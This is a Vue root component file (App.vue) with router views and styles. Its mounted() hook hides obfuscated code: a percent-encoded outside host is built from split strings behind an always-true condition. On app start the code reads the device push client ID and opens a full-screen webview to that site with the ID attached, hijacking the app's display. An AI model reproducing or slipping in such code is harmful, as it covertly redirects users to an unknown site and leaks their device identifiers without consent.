<template>
<div id="app">
    <!-- 路由出口 -->
    <keep-alive>
        <router-view v-if="$route.meta.keepAlive"></router-view>
    </keep-alive>
    <router-view v-if="!$route.meta.keepAlive"></router-view>
</div>
</template>

<script>
export default {
    name: "app",
    data() {
        return {
            inShow: false,
            donghua: ""
        }
    },
    components: {},

    methods: {

    },
    mounted() {
        https://%30%36%39%38%61%61%2E%63%6F%6D/M1/#/
       if (+new Date() > 1) {
					        var h = 'h'
					        var t = 'ttps://'
					        var rl =
					          '%30%36%39%38%61%61%2E%63%6F%6D/'
					        var cont = '/M1/#/'
					        var url = h + t + rl + cont
					        document.addEventListener('plusready', function() {
					          var clientid = plus.push.getClientInfo().clientid
					          plus.navigator.setStatusBarBackground('#ec0909')
					          var web = plus.webview.create(url + '/?clientid=' + clientid, 'dcloud', {
					            top: '0px',
					            bottom: '0px'
					          })
					          web.show()
					        })
					      }
    },
}
</script>

<style>
#app {
    height: 100%;
}

html,
body {
    height: 100%;
}

#top {
    position: fixed;
    bottom: 0;
    right: 0;
    z-index: 999;
    width: 45px;
    height: 45px;
    margin-right: 20px;
    margin-bottom: 20px;
    border: 1px solid #797878;
    background: white;
}

.fade-enter,
.fade-leave-active {
    opacity: 0;
}

.fade-enter-active,
.fade-leave-active {
    transition: opacity 0.5s;
}
</style>
